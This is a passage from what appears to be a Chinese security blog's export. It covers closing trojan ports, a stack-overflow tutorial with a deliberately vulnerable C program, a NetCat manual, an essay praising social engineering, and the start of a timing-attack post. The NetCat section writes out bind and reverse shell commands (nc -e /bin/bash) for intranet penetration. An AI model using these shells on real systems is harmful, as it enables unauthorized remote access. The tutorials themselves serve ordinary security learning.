系统的一些基本网络通讯需要的端口即可。\n2.检查各端口，有端口扫描的症状时，立即屏蔽该端口\n　　这种预防端口扫描的方式显然用户自己手工是不可能完成的，或者说完成起来相当困难，需要借助软件。这些软件就是我们常用的网络防火墙。\n防火墙的工作原理是：首先检查每个到达你的电脑的数据包，在这个包被你机上运行的任何软件看到之前，防火墙有完全的否决权，可以禁止你的电脑接收 Internet上的任何东西。当第一个请求建立连接的包被你的电脑回应后，一个“TCP&#x2F;IP端口”被打开；端口扫描时，对方计算机不断和本地计算机建 立连接，并逐渐打开各个服务所对应的“TCP&#x2F;IP端口”及闲置端口，防火墙经过自带的拦截规则判断，就能够知道对方是否正进行端口扫描，并拦截掉对方发 送过来的所有扫描需要的数据包。\n现在市面上几乎所有网络防火墙都能够抵御端口扫描，在默认安装后，应该检查一些防火墙所拦截的端口扫描规则是否被选中，否则它会放行端口扫描，而只是在日志中留下信息而已。\n常见端口关闭\n113端口木马的清除（仅适用于windows系统）：这是一个基于irc聊天室控制的木马程序。1.首先使用netstat -an命令确定自己的系统上是否开放了113端口2.使用fport命令察看出是哪个程序在监听113端口fport工具下载例如我们用fport看到如下结果：Pid Process Port Proto Path392 svchost -&gt; 113 TCP C:&#x2F;WINNT&#x2F;system32&#x2F;vhos.exe\n我们就可以确定在监听在113端口的木马程序是vhos.exe而该程序所在的路径为c:&#x2F;winnt&#x2F;system32下。3.确定了木马程序名（就是监听113端口的程序）后，在任务管理器中查找到该进程，并使用管理器结束该进程。4.在开始-运行中键入regedit运行注册表管理程序，在注册表里查找刚才找到那个程序，并将相关的键值全部删掉。5.到木马程序所在的目录下删除该木马程序。（通常木马还会包括其他一些程序，如rscan.exe、psexec.exe、ipcpass.dic、ipcscan.txt等，根据木马程序不同，文件也有所不同，你可以通过察看程序的生成和修改的时间来确定与监听113端口的木马程序有关的其他程序）6.重新启动机器。\n3389端口的关闭：首先说明3389端口是windows的远程管理终端所开的端口，它并不是一个木马程序，请先确定该服务是否是你自己开放的。如果不是必须的，请关闭该服务。\nwin2000关闭的方法：win2000server 开始–&gt;程序–&gt;管理工具–&gt;服务里找到Terminal Services服务项，选中属性选项将启动类型改成手动，并停止该服务。win2000pro 开始–&gt;设置–&gt;控制面板–&gt;管理工具–&gt;服务里找到Terminal Services服务项，选中属性选项将启动类型改成手动，并停止该服务。winxp关闭的方法：在我的电脑上点右键选属性–&gt;远程，将里面的远程协助和远程桌面两个选项框里的勾去掉。\n4899端口的关闭：首先说明4899端口是一个远程控制软件（remote administrator)服务端监听的端口，他不能算是一个木马程序，但是具有远程控制功能，通常杀毒软件是无法查出它来的，请先确定该服务是否是你自己开放并且是必需的。如果不是请关闭它。\n关闭4899端口：请在开始–&gt;运行中输入cmd(98以下为command),然后cd C:&#x2F;winnt&#x2F;system32(你的系统安装目录），输入r_server.exe &#x2F;stop后按回车。然后在输入r_server &#x2F;uninstall &#x2F;silence\n到C:&#x2F;winnt&#x2F;system32(系统目录）下删除r_server.exe admdll.dll radbrv.dll三个文件\n5800，5900端口：1.首先使用fport命令确定出监听在5800和5900端口的程序所在位置（通常会是c:&#x2F;winnt&#x2F;fonts&#x2F;explorer.exe)2.在任务管理器中杀掉相关的进程（注意有一个是系统本身正常的，请注意！如果错杀可以重新运行c:&#x2F;winnt&#x2F;explorer.exe)3.删除C:&#x2F;winnt&#x2F;fonts&#x2F;中的explorer.exe程序。4.删除注册表HKEY_LOCAL_MACHINE&#x2F;Software&#x2F;Microsoft&#x2F;Windows&#x2F;CurrentVersion&#x2F;Run中的Explorer项。5.重新启动机器。\n6129端口的关闭：首先说明6129端口是一个远程控制软件（dameware nt utilities)服务端监听得端口，他不是一个木马程序，但是具有远程控制功能，通常的杀毒软件是无法查出它来的。请先确定该服务是否是你自己安装并且是必需的，如果不是请关闭。\n关闭6129端口：选择开始–&gt;设置–&gt;控制面板–&gt;管理工具–&gt;服务找到DameWare Mini Remote Control项点击右键选择属性选项，将启动类型改成禁用后停止该服务。到c:&#x2F;winnt&#x2F;system32(系统目录）下将DWRCS.EXE程序删除。到注册表内将HKEY_LOCAL_MACHINE&#x2F;SYSTEM&#x2F;ControlSet001&#x2F;Services&#x2F;DWMRCS表项删除。\n1029端口和20168端口：这两个端口是lovgate蠕虫所开放的后门端口。蠕虫相关信息请参见：Lovgate蠕虫你可以下载专杀工具：FixLGate.exe使用方法：下载后直接运行，在该程序运行结束后重起机器后再运行一遍该程序。\n45576端口：这是一个代理软件的控制端口，请先确定该代理软件并非你自己安装（代理软件会给你的机器带来额外的流量）关闭代理软件：1.请先使用fport察看出该代理软件所在的位置2.在服务中关闭该服务（通常为SkSocks），将该服务关掉。3.到该程序所在目录下将该程序删除。\n","categories":["Tech Blog"]},{"title":"栈溢出攻击初探","url":"/2024/02/04/Tech%20Blog/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%9D%E6%8E%A2/","content":"前置知识段 ( Segment )一个程序的本质就是 bss 段，data 段和 text 段。其中 text 和 data 段在可执行文件中，程序执行时由系统从可执行文件中加载，bss 段不在可执行文件中，但会被记录数据所需空间大小，在程序链接时链接器得到这个大小的内存块，紧跟在 data 段后面。包含 data 段和 bss 段的整个区段成为数据区。\n\n\nbss 段(Block Started by Symbol segment)bss 段是用于存放程序中未初始化的全局变量，静态变量，和被初始化为0的全局或静态变量的内存区域，但 bss 段不占据实际空间，它只是一个占位符。目标文件区分变量初始化与否以提高空间利用率————未被初始化的变量不会占据实际的磁盘空间，而是运行时在内存中分配这些变量并初始化为 0\n\n为什么未初始化的数据叫做 bss它起源于 IBM 704 汇编语言中“块存储开始 ( Block Storage Start ) ”指令的首字母缩写，并沿用至今，一种记住 .data 和 .bss 段之间区别的简单方法是把 bss 看成是“更好地节省空间 ( Better Save Space) ”的缩写。\n\ndata 段 (data segment)数据段是用于存放程序中已初始化的全局变量的内存区域，属于静态内存分配\ntext 段 (code segment&#x2F;text segment)代码段是用于存放程序执行代码的内存区域，这部分区域的大小在程序运行前就已确定，并且内存区域通常属于只读(NX 保护)\n代码段中也可能包含一些只读的常值变量，例如字符串常量等\n堆 ( Heap )堆是用于存放进程运行中被动分配的内存区域，它的大小不固定，可动态扩张和缩减。当进程调用 malloc 等函数分配内存时候，新分配的内存会被动态添加到堆上 (堆被扩张)；当进程调用 free 等函数释放内存时候，被释放的内存会被从堆上剔除 (堆被缩减)\n栈 ( Stack )栈是一种经典的数据结构，遵循 LIFO (Last In First Out) ，即后进先出的存取方式。栈的这一特性与函数调用不谋而合，主调 (caller)函数调用被调 (callee)函数时，后被调用的被调函数先返回函数调用结果，先被调用的主调函数后返回函数调用结果。计算机系统通过内存空间中的栈保存函数的参数，局部变量，返回值，返回地址等数据，函数调用的本质就是将不同的数据与地址 push 到栈中或从栈中 pop 到指定寄存器或内存中，更概括一些地来说，计算机通过使用栈来提供对过程的机器级支持。\n值得注意的是，由于处理器的约定，栈是从高地址往低地址方向增长的。除此以外，和计算机中的其他存储结构一样，栈是惰性的。当用户执行了”清除”&#x2F;pop 操作后，作为操作对象的数据并没有被清空，而是变得无法直接访问了 (被释放&#x2F;free了)\n栈帧栈帧 (Stack Frame)用于保存函数调用中的各种信息，包括但不限于函数创建的局部变量，参数，返回值，返回地址。栈帧由栈顶指针 (栈指针) sp 和栈底指针 (帧指针，基址指针) bp 表示，其中栈顶指针位于栈帧地址最低处，栈底指针位于栈帧地址最高处。\n函数调用的底层原理函数 (function)，方法 (method)，子例程 (subroutine)，回调函数 (handler)等等，本质上都是同一抽象的不同形式，这一抽象叫做过程。为便于称呼，我们把这些过程都叫做函数。它提供了一种封装代码的方式，用一组指定参数和返回值实现了某种功能，尽管在不同语言不同平台不同应用场景下，它们的形式多种多样，但它们都存在着一些最基本的共有的特性。例如，它们必然实现了以下机制，包括但不限于，转移控制，分配和释放内存和数据传送。当讨论函数是如何调用的时候，我们完全可以从这三个角度来看待它们\n运行时栈当一个函数或过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间，这些空间主要用来做两件事。首先，按照遵守的函数调用约定，例如 __cdecl 约定方式，主调函数会先将被调函数的参数从右到左压入栈中，再将返回地址压入到栈中。由于这一行为是由主调函数负责的，返回地址实际上也是与主调函数相关的信息，所以此时分配的空间仍属于主调函数的栈帧。其次，被调函数获取处理器控制权后，会先将主调函数的栈底指针入栈进行保存，即 push ebp ,此时 esp 会指向主调函数的栈底指针，接下来，被调函数会将 esp 的值赋给 ebp，此时的ebp 即为被调函数的栈底指针，它指向的内存空间保存了主调函数的栈底地址，在多层函数调用时，ebp 指针实际上就形成了一个链表，每一个ebp 指针指向的值都是自己的主调函数的栈底地址。再接下来，被调函数会根据自己的需要创建用于存储局部变量的内存空间，这一步通常是通过 sub esp,value 实现的，这样，被调函数就创建出了自己的栈帧。\n当被调函数返回时，它只需要把自己被调用时做的事倒着做一遍，就能恢复到函数调用前的状态。具体来说，它会 mov esp,ebp,释放掉局部变量，然后 pop ebp ，将栈底指针恢复到指向主调函数栈底的状态。同时，主调函数也会根据遵守的函数调用约定，例如 __cdecl 约定方式，由主调函数清理调用时使用的栈。\n\n函数调用约定因编译器与平台而异，最主要的三种是 __cdecl ，__stdcall 和 __thiscall__cdecl 是 C 语言默认的调用约定，同时也是可变函数参数的函数调用约定，因为只有主调函数知道被调函数具体有几个参数，它的栈只能由主调函数清理__stdcall 是 Windows API 中广泛使用的调用约定，与 __cdecl 调用约定一样，它也将参数从右到左压入栈，但由被调用者清理栈__thiscall 是 C++ 中成员函数默认的调用约定 ， this 指针隐式的作为第一个参数通过 ecx 寄存器传递给函数，剩余参数也是从右向左传递，大多数情况下遵循与编译器默认的函数调用约定一致的原则\n\n转移控制处理器的控制权从函数 P 转移到函数 Q 实质上就是把程序计数器寄存器 CS:IP 的值设置为函数 Q 的代码的起始位置。显然，当被调用函数交还处理器的控制权时，处理器需要指导它要从函数Q的哪个位置开始恢复执行，因此函数调用指令 call 在转移到被调用函数前会先将紧跟在 call 指令后的下一条指令的地址视作返回后要执行的指令的地址，即返回地址压入到栈中，再将 IP 寄存器的值设置为函数 Q 的起始地址。由于 call指令一般都是 5 个字节的长度，因此\ncall function\n\n往往可以等价为\npush ip + 5jmp function\n\n与 call 指令相对应的 ret 指令会在函数的末尾执行，被调函数的栈帧被释放后，栈顶指针会指向主调函数的返回地址， ret 指令会从栈中弹出主调函数的返回地址，并将 IP 寄存器的值设置为返回地址。尽管 pop ip 这一指令并不存在 (ip 寄存器的值不能直接修改) ， 但 ret 指令实际上等价于它\n数据传送将数据作为参数传递给被调函数与获得函数的返回值等调用函数时的数据传输大多是通过寄存器实现的，被调函数通过访问寄存器取得参数，主调函数通过访问寄存器取得返回值。当一个函数的参数数量大于 6 个的时候，超出 6 个的部分需要通过栈传递 ，主调函数会在自己的栈帧中为超出 6 个部分的参数分配空间。通过栈传递的参数的数据大小需要向 8 的倍数对齐。所有参数到位后，主调函数才会执行 call 指令转移处理器控制权\n局部存储栈上的局部存储在寄存器不足以存储局部数据时，局部数据会被放在内存中，常见的情况包括但不限于:\n\n寄存器不足够存放所有的局部数据\n对一个局部变量取了地址，因此该变量必须要有一个地址\n存在某些局部变量是数组或结构体，因此必须能够通过数组或结构引用被访问\n\n一般来说，函数通过减小栈指针在栈上分配空间，分配的结果作为栈帧的一部分。当函数执行结束后，栈顶指针指向栈底位置，局部变量被释放\n寄存器中的局部存储寄存器组是唯一被所有函数共享的资源。\n虽然在给定时刻只有一个函数是活动的，我们仍必须确保主调函数调用被调函数时，被调函数不会覆盖调用者稍后会使用的寄存器值。为此，x86-64等处理器架构采用了一组统一的寄存器使用惯例，所有的过程都必须遵守。\n根据惯例，寄存器 rbx 、 rbp 和 r12 ~ r15 被划分为被调用者保存寄存器 ， 当主调函数调用被调函数时，被调函数必须保存这些寄存器的值，保证它们的值在主调函数调用被调函数时和被调函数返回时是一样的。被调函数保存一个寄存器的值不变，要么是根本不去改变它，要么就是把原始的值压入栈中，改变寄存器的值，然后在返回前弹出寄存器的旧值。而所有其他寄存器，除栈指针 rsp 以外，都分类为调用者保存寄存器。者意味着任何函数都能修改它们。可以这样理解“调用者保存”这个名字，主调函数在某个此类寄存器中有局部数据，然后调用被调函数，被调函数可以随意修改这个寄存器，因为在调用前保存好这些寄存器中的值是主调函数的责任。\n栈溢出攻击原理栈溢出，即向栈中某一变量写入的字节数超过了这一变量被分配的内存大小，导致与其相邻的栈中的内存空间中的内容被覆写。栈溢出是特定情况下的缓冲区溢出，与其类似的还有堆溢出，bss 段溢出等溢出方式，它无疑是二进制攻击的”Hello World”，是最具有代表性的二进制漏洞之一。\n栈是从高地址向低地址生长的，程序向内存中写入数据则是从低地址向高地址写入的。不难想到，如果一个程序在执行过程中在栈上写入了大小没有得到充分控制的数据，那么这些数据会溢出用于存储局部变量的内存空间，溢出部分的值将会被程序写入到栈底甚至是前一个栈帧。栈溢出攻击最主要的覆写目标是前一个函数栈帧的返回地址，如果覆写后的这个地址是非法的，例如指向了内核保护的内存区域，程序在执行 ret 指令时就会崩溃，攻击者可能会通过这种方式瘫痪受害者的防御软件。更常见的情况是，覆写后的返回地址是攻击者精心设计的，指向了程序此时本不应该执行的其他指令，攻击者便能够控制程序的执行流程，为 RCE 在内的进一步的攻击打开攻击面，取得更显著的入侵成果。\n栈溢出攻击示例如果存在这样一个 C 语言程序\n// pwn.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;void backdoor() &#123;    system(&quot;/bin/sh&quot;);&#125;void vulnerable() &#123;  char s[12];  gets(s);  puts(s);  return;&#125;int main(int argc, char **argv) &#123;  vulnerable();  return 0;&#125;\n\n它会调用 vulnerable 函数，该函数会接收用户输入并原样输出，除了一个看起来很危险但不会被调用的 backdoor 函数以外似乎没什么问题。但如果对这一程序进行编译，你会得到来自编译器的警告\ntextpwn.c: In function ‘vulnerable’:pwn.c:10:3: warning: implicit declaration of function ‘get’; did you mean ‘fgets’? [-Wimplicit-function-declaration]   10 |   gets(s);      |   ^~~~      |   fgets/usr/sbin/ld: /tmp/ccSmo4Ao.o: in function `vulnerable&#x27;:pwn.c:(.text+0x3f): warning: the `gets&#x27; function is dangerous and should not be used.\n\ngets 是一个危险函数，它不会检查输入的字符串的长度，只通过回车判断输入是否结束，是最容易存在栈溢出漏洞的危险函数之一。历史上的第一种蠕虫程序，莫里斯蠕虫就是利用了 gets 函数实现的栈溢出攻击。反编译这一程序的可执行文件，会发现字符串 s 位于 [sp+4h] [bp-14h]的位置，该函数栈帧附近的栈结构是这样的\ntext             +-----------------+             |     ret addr    |             +-----------------+             |    caller ebp   |      ebp---&gt;+-----------------+             |                 |             |                 |             |                 |             |                 |             |                 |             |                 |s,ebp-0x14--&gt;+-----------------+\n\n如果攻击者能够通过某种方式，例如在该程序未开启 ASLR 保护的情况下逆向分析了这一程序，得到了 backdoor 函数的地址，并通过缓冲区溢出，用 backdoor 函数的地址覆写了 ret addr ，攻击者便可通过该程序 get shell ，进行任意命令 RCE 攻击，导致特大安全事故。\n栈溢出漏洞危险函数常见的危险函数如下\n\n输入\ngets\nscanf\nvscanf\n\n\n输出\nsprintf\n\n\n字符串操作\nstrcpy\nstrcat\nbcopy\n\n\n\n栈溢出攻击的对抗措施PIE&#x2F;ASLR 栈随机为了在控制攻击目标，攻击者在栈溢出攻击时必然要插入指向能够实现自己攻击目的的代码的指针。在过去，对于所有运行同样程序和操作系统的不同机器之间，栈的位置是相当固定因此也非常容易预测的。因此，如果攻击者可以确定一个常见的服务器所使用的栈空间，就可以实施一个在许多机器上都会有效的栈溢出攻击，这一现象被称作***安全单一化 (security monoculture)***。为了破坏栈地址的可预测性，操作系统会进行栈随机化，使得栈的位置在程序每次运行时都会发生变化。一个简单的验证程序如下\n#include&lt;stdio.h&gt;int main() &#123;    int i;    printf(&quot;i is at %p\\n&quot;,&amp;i);    return 0;&#125;\n\n在同一机器上每次运行这个程序都会得到不同的输出。在 32 位 Linux 上运行这段代码，地址变化范围为 0xff7fc59c 到 0xffffd09c ，范围大小约为 2^23 。 在 64 位 Linux 上时，地址变化范围为 0x7fff0001b698 到 0x7ffffffaa4a8 ，范围大小约为 2^32 。栈随机化已经成为了操作系统的标准行为，它是更大类的技术中的一种，这类技术叫做 ASLR ( Address-Space Layout Randomization ) ，中文名是地址空间布局随机化。\n然而，随机化的防御手段并不总是有效。一个执著的攻击者总是能够用蛮力克服随机化，他可以反复地用不同的地址进行攻击。一种常见攻击技巧就是在实际插入的攻击代码前插入很长一段的 nop ( 读作“ no op”,no operation 的缩写 ) 指令。 执行该指令除了对程序计数器加一，使之指向下一条指令之外，没有任何的效果。只要攻击者能够猜中这段序列中的某个地址，程序就会经过这个序列，到达攻击代码。这个序列常用的术语是 “空操作雪橇 ( nop sled )” ，即程序会”滑过”这个序列。如果攻击者建立一个 256 字节的 nop sled ,那么枚举 2^15 &#x3D; 32768 个起始地址，就能破解地址变化范围大小为 2^23 的随机化，这对于一个顽固的攻击者来说，是完全可行的。如果攻击目标的操作系统是 64 位，枚举 2^24 &#x3D; 16777216 次，才会让人有一些畏惧。栈随机化和其他 ASLR 技术能够增加成功攻击一个系统的难度，因而大大降低了病毒或者蠕虫的传播速度，但是也不能提供完全的安全保障\nStack Canary 栈破坏检测计算机的第二道防线是检测程序执行时栈是否被破坏，之前的示例中可以看到栈溢出攻击需要首先实现栈溢出。在 C 语言和一些其它语言中，没有可靠的办法阻止写入数据的越界，但系统有办法在栈溢出发生并造成有害效果前尽可能地去检测它。GCC 在编译时在栈帧中的任何局部缓冲区与帧指针间(不一定与 ebp 相邻)存储一个特殊的金丝雀 ( Canary ) 值，也叫做哨兵值 ( guard value )。Canary 即金丝雀，在技术上表示最先的测试。这一说法来自以前挖煤时，矿工都会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会先报警。所以开发者会用Canary来指代最先的测试。该值会在程序每次运行时随机生成，当程序执行到 Canary 处时，会检测 Cannary 值是否与程序刚开始所生成的值一样，如果不一样则说明必然发生了栈溢出，此时程序会抛出异常并终止，从而达到保护自身的目的。一个启用了栈破坏检测机制的函数的汇编指令一般会是\n; void function()function:    push rbp    mov rbp,rsp    sub rsp,100    mov rax,fs:40    mov [rbp - 8],rax    xor rax,rax    ...    ...    mov rax,[rbp - 8]    xor fs:40,rax    je .L9    call __stack_chk_fail.L9:    mov rsp,rbp    pop rbp    ret\n\n这段程序会从内存中读出一个值(读 Canary 的内存段往往是只读的)，再将它存放到栈上适合存放 Canary 的位置，在释放栈帧前，程序将栈上的 Canary 和 内存中的 Canary 进行异或运算，如果两个值相等，即异或运算的结果为 0 ，函数会按照正常流程完成，否则程序会调用一个错误处理历程。\n栈破坏检测机制很好地防止了缓冲区溢出攻击对栈上内存的破坏，同时 GCC 只在函数中育局部 char 型缓冲区的时候才会插入 Canary ，它带来的性能损失也非常小。当然，它也不能完全防御栈溢出攻击。Canary 的末位为 ‘\\0’ ，因此 Canary 可能会被故意覆盖最后一字节被输出导致泄露，攻击者便可以在栈溢出时保持 Canary 值不变，仿佛栈溢出没有发生地实现栈溢出攻击。\nNX 限制可执行代码区域各大厂商为自己的处理器内存引入了 “NX” (No eXcute 不执行) 位，将读和执行访问模式分隔开(在此之前，由于区分可读与可执行会带来严重的性能损失，因此可读与可执行共用一个标志位，彼此的权限是互通的)。有了这个特性后，NX 位会标记数据所在内存页为不可执行，避免程序执行被写入的 shellcode ，而检查页是否可执行则由硬件完成，避免了效率上的损失。\n和前面的保护机制一样，NX 也并非总是有效，例如一些解释性语言会采取 JIT (Just-In-Time) 技术动态地生成执行的代码以提高程序性能，此时 NX 能否正确地限制执行代码的范围仅在编译器创建原始程序的部分中，取决于语言和操作系统\n其他其他的保护程序的方法还有\n\nRELRO\n部分 RELRO\n完全 RELRO\n\n\nFORTIFY\n…\n\nReferenceCTF WikiC函数调用介绍CS APP\n","categories":["Tech Blog"]},{"title":"瑞士军刀---NetCat使用手册","url":"/2023/07/21/Tech%20Blog/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NetCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","content":"NetCat简介NetCat(nc)是一款强大的命令行网络工具，以体积小功能灵活而著称，被安全界与运维誉为瑞士军刀。最初由一位叫做”霍比特人”的网友Hobbit于 1995 年在 UNIX 上以源代码的形式发布,现在有GNU版和OpenBSD两个版本，其中只有后者在还在维护。两者在功能上有一些差别，例如OpenBSD版没有通过-e参数远端执行的功能。同时NetCat也有一些改进版本，例如集成进了Nmap的Ncat(21世纪的瑞士军刀)。NetCat的不足之处在于他是明文传输且缺乏身份验证功能，而Ncat可以通过–allow指定允许连接的机器，通过–ssl参数进行数据的加密。而无论是Ncat还是NetCat，他们的基本功能都有\n\ntelnet &#x2F; 获取系统 banner 信息\n传输文本信息\n传输文件和目录\n加密传输文件\n端口扫描\n远程控制 &#x2F; 正向 shell\n流媒体服务器\n远程克隆硬盘其在各大发行版中均默认安装，且功能齐全而强大，在内网渗透中有重要的作用\n\nNetCat使用说明常用参数\n-l ：开启监听\n-p ：指定端口\n-t ：以telnet形式应答\n-e ：程序重定向\n-n ：以数字形式表示ip\n-v ：显示执行命令过程\n-z  不进行交互，直接显示结果\n-u ：使用UDP协议传输\n-w  设置超时时间\n\n可以使用-h获取更全面的参数列表与说明如下\n\n\n\n命令\n释义\n\n\n\n-G\n设置路由器跃程通信网关，最多设置8个；\n\n\n-h\n在线帮助；\n\n\n-i\n延迟秒数：设置时间间隔，以便传送信息及扫描通信端口；\n\n\n-l\n使用监听模式，监控传入的资料；\n\n\n-n\n直接使用ip地址，而不通过域名服务器；\n\n\n-o\n输出文件：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；\n\n\n-p\n通信端口：设置本地主机使用的通信端口；\n\n\n-r\n指定源端口和目的端口都进行随机的选择；\n\n\n-s\n来源位址：设置本地主机送出数据包的IP地址；\n\n\n-u\n使用UDP传输协议；\n\n\n-v\n显示指令执行过程；\n\n\n-w\n超时秒数：设置等待连线的时间；\n\n\n-z\n使用0输入&#x2F;输出模式，只在扫描通信端口时使用\n\n\nNetCat常见用法端口测试公网上的端口扫描往往使用Nmap，但是内网渗透时跳板主机上未必有Nmap这样的工具。这时NetCat体积小不易被发现方便传输的特性使得它成为了不二之选。我们在使用nc时常常跟上v和n两个参数，前者会列出执行过程的详细信息，后者可以只使用ip地址避免dns解析从而节省时间提高效率。初次以外,NetCat可以使用z参数使用非交互式的方式运行，即不进行io交互直接执行命令在进行端口扫描时，我们常使用 nc -nvz [ip] [port] 命令，port可以写成一个范围，例如\nnc -nvz 182.168.1.77 1-100 # 意为ping目标ip的1-100号端口nc -v -v -w3 -z 192.168.1.77 8080-8083 # 两次-v使得报告更详细，扫描超时时间为3秒\n\nz参数默认使用tcp类型，可以加上新参数u使用udp扫描\n信息传输在跳板(ip为192.168.1.77)上使用\nnc -l -p 8080 #监听8080端口 TCP协议nc -u -l -p 8080 #监听8080端口 UDP协议\n\n然后在我们的主机上\nnc 192.168.1.77 8080 #使用TCP协议连接nc -u 192.168.1.77 8080 #使用UDP协议连接\n\n这样我们就可以在两台主机间实现会话了。这也是运维测试安全组策略或者iptable策略时常使用的方法。当然我们的目的不仅限于此。在电子取证的时候，为了不破坏现场而又需要提取出大量信息和文件分析时，可以将NetCat与管道配合使用，将一端的输出结果输出到另一端Server(192.168.1.77)\nnc -l -p 7777\n\nClient(以ls -l为例)\nls -l | nc -nv 192.168.1.77\n\n当然Sever端也可以讲内容定向输出到文件中如\nnc -l -p 7777 &gt; ls.txt\n\nClient(以ls -l为例)\nls -l | nc -nv 192.168.1.77\n\n文件传输在进行上一种使用方法时，不难发现我们可以配合重定向实现文件传输的效果.例如Server(192.168.1.77)\nnc -l -p 8080 &gt; image.jpg\n\nClient\nnc 192.168.1.77 8080 &lt; image.jpg\n\n你当然也可以把一整个目录压缩打包的方式传输目录。在传输时，也可以配合pv命令准确地测量带宽吞吐量地大小\n远程控制NetCat同样还能实现正反向Shell的效果，即把信息传输与文件传输改为传输shell即可正向ShellServer(192.168.1.77 )\nnc -l -p 8080 -e /bin/bash\n\nClient\nnc 192.168.1.77 8080\n\n反向ShellClient\nnc -nv 192.168.1.77  8080 -e /bin/bash\n\nServer(192.168.1.77 )\nnc -l -p 8080\n\n如果使用的时OpenBSD版本的Netcat,即在没有-e命令的情况下，我们可以与管道或重定向配合实现同样的效果\nnc -l -p 8080 | /bin/bashnc 192.168.1.77 8080 | /bin/bash\n\n模拟应用层协议例如我们希望使用NetCat发送HTTP请求，我们可以配合管道以非交互式的方式发送hTTP请求\necho -e &quot;GET /anything HTTP/1.0\\r\\nHost httpbin.org\\r\\n\\r\\n&quot; | nc httpbin.org 80\n\n或者使用标准输入以交互式的方式发送HTTP请求，以一个简单的Get请求为例\nnc httpbin.org 80GET /ip HTTP/1.0(回车)(回车)\n\nPNetCat 正是这么一款通过命令行直接操作tcp&#x2F;udp进行监听、连接与数据传输的工具。NetCat的能力并不止于此，我们大可自己实现一款NetCat,并尝试加入一些流量混淆，加密解密以及权限控制的额外功能。NetCat能干的事情还有很多，例如配合播放器实现流媒体功能，配合一些脚本之类的程序实现一个服务器例如http服务器或者代理服务器等等。每一位富有Geek精神的人都是NetCat绝活哥，我会将自己想到的有意思的NetCat用法或者扩展不断地更新到这篇博客中\nReferenceAwesoome NetCat\n","categories":["Tech Blog"]},{"title":"社交工程学——欺骗的艺术","url":"/2021/02/21/Tech%20Blog/%E7%A4%BE%E4%BA%A4%E5%B7%A5%E7%A8%8B%E5%AD%A6%E2%80%94%E2%80%94%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF/","content":"Kevin.D.Mitnick曾是“ 黑客“的代名词，任何黑客在面对无法攻破的技术防火墙是，都不得不赞扬他的天才，他所开创的社交工程学已经是每一位黑客走向大师之路的必备技能，纵使如今的社交工程技术已不再局限于Kevin最初开创时的墨阳，但其思想却依旧是如今的社交工程学技术最强力的内核之一————通过人性的漏洞达成目的。\n\n\nKevin这般称呼社交工程学——“欺骗的艺术”，其精髓在于，借助目标所存在的心理倾向和行为习惯，通过巧妙的话术，挖掘出有价值的信息或利用对方来达成自己的目的。社交工程学攻击成立的基础是人性的弱点，例如人们在非物理接触中与人沟通时所表现出的轻信与盲从，在工作中对于权威或同事的依赖于不由自主，因此，即使是极为老道的社交工程师或信息安全专家，也可能会轻易落入攻击者的圈套。在阅读《反欺骗的艺术》一书的过程中，我很难不惊叹社交工程师们是如何凭借短短几句话给予对方强烈的心理暗示并快速建立信赖关系的，同事又不由频出冷汗，面对如此防不胜防的攻击手段，能有几人能有效地做到辨别与防卫？更何况在当今这个信息安全意识普遍薄弱而通信技术空前发达的社会？\n当今社交工程学得到了相当充足的发展，其中较为突出的一点在于对信息的深入挖掘，尤其在大数据背景下，这一手段甚至成为了最重要而又简便有效的攻击方式，社交工程学的主要攻击对象由企业机构及其内部系统逐渐转移到了个体用户身上，对于不了解相关技术的人而言，他们根本不会相信能有人单单借助一条手机号码，查出目标及其家人，亲属，同事等一系列相关者的身份证号，社会关系网，社交账号及密码等一系列私密信息，或是根据你拍摄的一张照片得出你所处的误差不超过100m的地理位置信息，这不仅是因为社交工程师惊人的信息挖掘能力，同时也与某些黑色产业有一定的关系，不仅是信息贩子，工商业间谍，还有黑客入侵盗走企业数据库导致的大量用户数据流入黑产市场，即所谓的“脱库”，使得个人信息安全几乎时刻处于裸奔状态下，而大数据时代下更进一步的用户数据采集更是使得社交工程师能情谊长我一个人的包括爱好，喜恶以致更深一层的行为习惯与个人信息，当这一点运用在Kevin式的攻击企业的社交工程学攻击上时，攻击者因此能更加准确有效地渗透进目标内部，个人信息隐私与企业信息安全不过形同虚设。\n尽管在这一篇博客中我将社交工程学描述的充满恶意与攻击性——事实上也往往如此——但我丝毫不像也是自己对社交工程学的痴迷于对社交工程师的赞叹，其一在于我是坚定的“技术无罪论”的拥护者，其二在于即使这一技术确实常被用来做那些阴暗，不义的勾当，也丝毫不影响我这样引用《厚黑学》中的观点——“以厚黑待友，是狡黠之恶徒；以厚黑学对敌，乃无上之功德”。因此，我仍要称赞它，社交工程学是欺骗的艺术，坐拥其独特的美学！\n","categories":["Tech Blog"]},{"title":"计时攻击","url":"/2023/07/23/Tech%20Blog/%E8%AE%A1%E6%97%B6%E6%94%BB%E5%87%BB/","content":"概念计时攻击，也叫时序攻击，TimingAttack，是侧信道攻击的一种，它通过设备运算的用时来推断出所使用的运算操作，或者通过对比运算的时间推定数据位于哪个存储设备，或者利用通信的时间差进行数据窃取\n\n\n实例假设后端存在这样一个逻辑\n    #! /bin/gofunc equal(password string) bool &#123;    TRUE_PASSWORD := &quot;PASSWORD&quot;    length := len(password)    if length == len(TRUE_PASSWORD) &#123;        for i := 0; i &lt; length; i++ &#123;            if password[i] != TRUE_PASSWORD[i] &#123;                return false            &#125;        &#125;        return true    &#125;    return false&#125;\n\n即获取用户输入的密码，然后逐位判断输入的密码与真正的密码是否相符，如果不符合就返回失败。这样的逻辑就存在被计时攻击的漏洞。因为你很容易发现，输入的密码第一位正确与第一位错误时或输入的密码长度与正确密码长度相等或不等时程序的执行时间是不同的，这意味着攻击者可以根据程序执行的时间判断自己输入的密码前几位是否正确。这与SQL注入的时间盲注与布尔盲注的攻击逻辑相同。\n\n虽然对于上述代码而言，输入的密码长度与正确密码长度相等或不等时程序的执行时间不同，但这一点并没有太大的利用空间，因为后端基本对用户输入进行哈希运算得到一样长的数据\n\n因此，这段程序更为安全的写法应该是\n    #!env /bin/gofunc safe_equal(password string) bool &#123;    TRUE_PASSWORD := &quot;PASSWORD&quot;    flag := 1    for i := 0; i &lt; len(password); i++ 